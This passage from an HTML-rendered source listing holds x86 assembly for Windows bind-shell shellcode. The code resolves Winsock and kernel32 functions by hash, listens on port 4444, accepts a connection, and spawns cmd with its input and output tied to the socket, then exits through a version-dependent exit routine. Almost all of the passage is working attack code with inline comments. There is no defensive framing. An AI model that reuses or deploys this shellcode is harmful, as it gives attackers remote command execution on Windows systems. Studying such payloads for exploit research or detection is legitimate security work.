push&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;SOCK_STREAM<br />	inc&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	push&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;AF_INET<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0xE0DF0FEA</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;hash(&nbsp;<span style="color:#3ad900;font-weight:400">"ws2_32.dll"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"WSASocketA"</span>&nbsp;)<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;WSASocketA(&nbsp;AF_INET,&nbsp;SOCK_STREAM,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;);<br />	xchg&nbsp;edi,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;save&nbsp;the&nbsp;socket&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;later,&nbsp;don't&nbsp;care&nbsp;about&nbsp;the&nbsp;value&nbsp;of&nbsp;eax&nbsp;after&nbsp;this<br /><br />		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;bind&nbsp;to&nbsp;0.0.0.0,&nbsp;pushed&nbsp;earlier&nbsp;[<span style="color:#ff0044;font-weight:400">4</span>]<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x5C110002</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;family&nbsp;AF_INET&nbsp;and&nbsp;port&nbsp;<span style="color:#ff0044;font-weight:400">4444</span><br />	mov&nbsp;esi,&nbsp;esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;save&nbsp;a&nbsp;pointer&nbsp;to&nbsp;sockaddr_in&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span><br />	push&nbsp;byte&nbsp;<span style="color:#ff0044;font-weight:400">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;length&nbsp;of&nbsp;the&nbsp;sockaddr_in&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;(we&nbsp;only&nbsp;set&nbsp;the&nbsp;first&nbsp;<span style="color:#ff0044;font-weight:400">8</span>&nbsp;bytes&nbsp;as&nbsp;the&nbsp;last&nbsp;<span style="color:#ff0044;font-weight:400">8</span>&nbsp;are&nbsp;unused)<br />	push&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;pointer&nbsp;to&nbsp;the&nbsp;sockaddr_in&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span><br />	push&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;socket<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x6737DBC2</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;hash(&nbsp;<span style="color:#3ad900;font-weight:400">"ws2_32.dll"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"bind"</span>&nbsp;)<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;bind(&nbsp;s,&nbsp;&amp;sockaddr_in,&nbsp;<span style="color:#ff0044;font-weight:400">16</span>&nbsp;);<br /><br />		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;backlog,&nbsp;pushed&nbsp;earlier&nbsp;[<span style="color:#ff0044;font-weight:400">3</span>]<br />	push&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;socket<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0xFF38E9B7</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;hash(&nbsp;<span style="color:#3ad900;font-weight:400">"ws2_32.dll"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"listen"</span>&nbsp;)<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;listen(&nbsp;s,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;);<br /><br />				;&nbsp;we&nbsp;set&nbsp;length&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;the&nbsp;sockaddr&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;to&nbsp;zero,&nbsp;pushed&nbsp;earlier&nbsp;[<span style="color:#ff0044;font-weight:400">2</span>]<br />				;&nbsp;we&nbsp;dont&nbsp;set&nbsp;the&nbsp;optional&nbsp;sockaddr&nbsp;param,&nbsp;pushed&nbsp;earlier&nbsp;[<span style="color:#ff0044;font-weight:400">1</span>]<br />	push&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;listening&nbsp;socket<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0xE13BEC74</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;hash(&nbsp;<span style="color:#3ad900;font-weight:400">"ws2_32.dll"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"accept"</span>&nbsp;)<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;accept(&nbsp;s,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;);<br /><br />	push&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;the&nbsp;listening&nbsp;socket&nbsp;to&nbsp;close<br />	xchg&nbsp;edi,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;replace&nbsp;the&nbsp;listening&nbsp;socket&nbsp;with&nbsp;the&nbsp;new&nbsp;connected&nbsp;socket&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;further&nbsp;comms<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x614D6E75</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;hash(&nbsp;<span style="color:#3ad900;font-weight:400">"ws2_32.dll"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"closesocket"</span>&nbsp;)<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;closesocket(&nbsp;s&nbsp;);<br /><br />;&nbsp;By&nbsp;here&nbsp;we&nbsp;will&nbsp;have&nbsp;performed&nbsp;the&nbsp;bind_tcp&nbsp;connection&nbsp;and&nbsp;EDI&nbsp;will&nbsp;be&nbsp;out&nbsp;socket.<br />shell:<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x00646D63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;our&nbsp;command&nbsp;line:&nbsp;'cmd',<span style="color:#ff0044;font-weight:400">0</span><br />	mov&nbsp;ebx,&nbsp;esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;save&nbsp;a&nbsp;pointer&nbsp;to&nbsp;the&nbsp;command&nbsp;line<br />	push&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;our&nbsp;socket&nbsp;becomes&nbsp;the&nbsp;shells&nbsp;hStdError<br />	push&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;our&nbsp;socket&nbsp;becomes&nbsp;the&nbsp;shells&nbsp;hStdOutput<br />	push&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;our&nbsp;socket&nbsp;becomes&nbsp;the&nbsp;shells&nbsp;hStdInput<br />	xor&nbsp;esi,&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Clear&nbsp;ESI&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;all&nbsp;the&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>'s&nbsp;we&nbsp;need&nbsp;to&nbsp;push<br />	push&nbsp;byte&nbsp;<span style="color:#ff0044;font-weight:400">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;We&nbsp;want&nbsp;to&nbsp;place&nbsp;(<span style="color:#ff0044;font-weight:400">18</span>&nbsp;*&nbsp;<span style="color:#ff0044;font-weight:400">4</span>)&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">72</span>&nbsp;null&nbsp;bytes&nbsp;onto&nbsp;the&nbsp;stack<br />	pop&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Set&nbsp;ECX&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;the&nbsp;loop<br /><br />push_loop:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	push&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;a&nbsp;null&nbsp;dword<br />	loop&nbsp;push_loop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;keep&nbsp;looping&nbsp;untill&nbsp;we&nbsp;have&nbsp;pushed&nbsp;enough&nbsp;nulls<br />	mov&nbsp;word&nbsp;[esp&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">60</span>],&nbsp;<span style="color:#ff0044;font-weight:400">0x0101</span>&nbsp;;&nbsp;Set&nbsp;the&nbsp;STARTUPINFO&nbsp;Structure's&nbsp;dwFlags&nbsp;to&nbsp;STARTF_USESTDHANDLES&nbsp;|&nbsp;STARTF_USESHOWWINDOW<br />	lea&nbsp;eax,&nbsp;[esp&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">16</span>]&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Set&nbsp;EAX&nbsp;as&nbsp;a&nbsp;pointer&nbsp;to&nbsp;our&nbsp;STARTUPINFO&nbsp;Structure<br />	mov&nbsp;byte&nbsp;[eax],&nbsp;<span style="color:#ff0044;font-weight:400">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Set&nbsp;the&nbsp;size&nbsp;of&nbsp;the&nbsp;STARTUPINFO&nbsp;Structure<br />	;&nbsp;perform&nbsp;the&nbsp;call&nbsp;to&nbsp;CreateProcessA<br />	push&nbsp;esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Push&nbsp;the&nbsp;pointer&nbsp;to&nbsp;the&nbsp;PROCESS_INFORMATION&nbsp;Structure&nbsp;<br />	push&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Push&nbsp;the&nbsp;pointer&nbsp;to&nbsp;the&nbsp;STARTUPINFO&nbsp;Structure<br />	push&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;The&nbsp;lpCurrentDirectory&nbsp;is&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>&nbsp;so&nbsp;the&nbsp;new&nbsp;process&nbsp;will&nbsp;have&nbsp;the&nbsp;same&nbsp;current&nbsp;directory&nbsp;as&nbsp;its&nbsp;parent<br />	push&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;The&nbsp;lpEnvironment&nbsp;is&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>&nbsp;so&nbsp;the&nbsp;new&nbsp;process&nbsp;will&nbsp;have&nbsp;the&nbsp;same&nbsp;enviroment&nbsp;as&nbsp;its&nbsp;parent<br />	push&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;We&nbsp;dont&nbsp;specify&nbsp;any&nbsp;dwCreationFlags&nbsp;<br />	inc&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Increment&nbsp;ESI&nbsp;to&nbsp;be&nbsp;one<br />	push&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Set&nbsp;bInheritHandles&nbsp;to&nbsp;<span style="color:#0088ff;font-weight:700">TRUE</span>&nbsp;in&nbsp;order&nbsp;to&nbsp;inheritable&nbsp;all&nbsp;possible&nbsp;handle&nbsp;from&nbsp;the&nbsp;parent<br />	dec&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Decrement&nbsp;ESI&nbsp;back&nbsp;down&nbsp;to&nbsp;zero<br />	push&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Set&nbsp;lpThreadAttributes&nbsp;to&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span><br />	push&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Set&nbsp;lpProcessAttributes&nbsp;to&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span><br />	push&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Set&nbsp;the&nbsp;lpCommandLine&nbsp;to&nbsp;point&nbsp;to&nbsp;<span style="color:#3ad900;font-weight:400">"cmd"</span>,<span style="color:#ff0044;font-weight:400">0</span><br />	push&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Set&nbsp;lpApplicationName&nbsp;to&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>&nbsp;as&nbsp;we&nbsp;are&nbsp;using&nbsp;the&nbsp;command&nbsp;line&nbsp;param&nbsp;instead<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x863FCC79</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;hash(&nbsp;<span style="color:#3ad900;font-weight:400">"kernel32.dll"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CreateProcessA"</span>&nbsp;)<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CreateProcessA(&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;&amp;<span style="color:#3ad900;font-weight:400">"cmd"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#0088ff;font-weight:700">TRUE</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;&amp;si,&nbsp;&amp;pi&nbsp;);<br />	;&nbsp;perform&nbsp;the&nbsp;call&nbsp;to&nbsp;WaitForSingleObject<br />	mov&nbsp;eax,&nbsp;esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;save&nbsp;pointer&nbsp;to&nbsp;the&nbsp;PROCESS_INFORMATION&nbsp;Structure&nbsp;<br />	dec&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Decrement&nbsp;ESI&nbsp;down&nbsp;to&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>&nbsp;(INFINITE)<br />	push&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;INFINITE&nbsp;inorder&nbsp;to&nbsp;wait&nbsp;forever<br />	inc&nbsp;esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Increment&nbsp;ESI&nbsp;back&nbsp;to&nbsp;zero<br />	push&nbsp;dword&nbsp;[eax]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;the&nbsp;handle&nbsp;from&nbsp;our&nbsp;PROCESS_INFORMATION.hProcess<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x601D8708</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;hash(&nbsp;<span style="color:#3ad900;font-weight:400">"kernel32.dll"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"WaitForSingleObject"</span>&nbsp;)<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;WaitForSingleObject(&nbsp;pi.hProcess,&nbsp;INFINITE&nbsp;);<br /><br />;&nbsp;Finish&nbsp;up&nbsp;with&nbsp;the&nbsp;EXITFUNK.<br /><br />exitfunk:<br />	mov&nbsp;ebx,&nbsp;<span style="color:#ff0044;font-weight:400">0x0A2A1DE0</span>&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;The&nbsp;EXITFUNK&nbsp;as&nbsp;specified&nbsp;by&nbsp;user...<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x9DBD95A6</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;hash(&nbsp;<span style="color:#3ad900;font-weight:400">"kernel32.dll"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"GetVersion"</span>&nbsp;)<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;GetVersion();&nbsp;(AL&nbsp;will&nbsp;=&nbsp;major&nbsp;version&nbsp;and&nbsp;AH&nbsp;will&nbsp;=&nbsp;minor&nbsp;version)<br />	cmp&nbsp;al,&nbsp;byte&nbsp;<span style="color:#ff0044;font-weight:400">6</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;If&nbsp;we&nbsp;are&nbsp;not&nbsp;running&nbsp;on&nbsp;Windows&nbsp;Vista,&nbsp;<span style="color:#ff0044;font-weight:400">2008</span>&nbsp;or&nbsp;<span style="color:#ff0044;font-weight:400">7</span><br />	jl&nbsp;<span style="color:#7f0044;font-weight:400">short</span>&nbsp;goodbye&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Then&nbsp;just&nbsp;call&nbsp;the&nbsp;exit&nbsp;function...<br />	cmp&nbsp;bl,&nbsp;<span style="color:#ff0044;font-weight:400">0xE0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;If&nbsp;we&nbsp;are&nbsp;trying&nbsp;a&nbsp;call&nbsp;to&nbsp;kernel32.dll!ExitThread&nbsp;on&nbsp;Windows&nbsp;Vista,&nbsp;<span style="color:#ff0044;font-weight:400">2008</span>&nbsp;or&nbsp;7...<br />	jne&nbsp;<span style="color:#7f0044;font-weight:400">short</span>&nbsp;goodbye&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	mov&nbsp;ebx,&nbsp;<span style="color:#ff0044;font-weight:400">0x6F721347</span>&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Then&nbsp;we&nbsp;substitute&nbsp;the&nbsp;EXITFUNK&nbsp;to&nbsp;that&nbsp;of&nbsp;ntdll.dll!RtlExitUserThread<br /><br />goodbye:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;We&nbsp;now&nbsp;perform&nbsp;the&nbsp;actual&nbsp;call&nbsp;to&nbsp;the&nbsp;exit&nbsp;function<br />	push&nbsp;byte&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;the&nbsp;exit&nbsp;function&nbsp;parameter<br />	push&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;the&nbsp;hash&nbsp;of&nbsp;the&nbsp;exit&nbsp;function<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;call&nbsp;EXITFUNK(&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;);<br /></div></div></div></body></html>